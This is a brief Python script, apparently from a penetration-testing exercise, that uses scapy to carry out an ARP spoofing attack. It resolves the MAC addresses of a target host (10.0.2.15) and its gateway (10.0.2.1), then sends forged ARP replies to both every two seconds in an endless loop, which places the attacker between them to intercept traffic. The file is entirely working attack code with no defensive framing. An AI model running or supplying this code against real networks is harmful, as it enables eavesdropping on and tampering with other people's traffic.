import scapy.all as scapy
import time


def get_mac(ip):
    answered_list = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip), verbose=False, timeout=1)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)


while True:
    spoof("10.0.2.15", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.15")
    time.sleep(2)